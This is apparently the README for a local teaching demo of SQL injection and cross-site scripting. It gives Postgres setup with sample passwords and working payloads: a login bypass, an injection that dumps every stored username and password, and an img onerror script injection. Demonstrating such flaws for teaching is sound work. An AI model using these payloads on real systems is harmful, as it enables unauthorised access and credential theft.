# Demo of SQL Injection and Cross Site Scripting

## Setup
In Postgres, create a database `demo`, user `demo`, password `demo`

    create table users(number serial, name text, email text, message text);
    grant all on users to demo;
    grant all on users_number_seq to demo;
    insert into users(name,message) values('Alice','Such a good cause, hope you succeed'),('Bob Smith', 'This is great'),('Charles', 'You guys are amazing!'),('Danii','Good work!');
    create table login(name text, password text);
    grant all on login to demo;
    insert into login values('admin', 'opensesame'),('alice','s3cr3t'),('bob','gunners4eva'),('charlie','shhh');


## Running

Start the server

    node server.js

open http://localhost:8000/login.html in a browser

### On the login screen

in user name put `admin`, in password put

    ' or 1=1--

observe that you can log in (`' or 1=1--` is not the actual password!)

### On the Join Us form

In message put

    ') returning (select string_agg(concat(name,'/',password),',') as number from login)--

observe that it shows you all the users and passwords.

In message put

    <img src="" onerror="alert(`Now sending all your cookies to the bad guys`)"/>

Load the "See all our backers" page. Observe that the naughty Javascript runs.

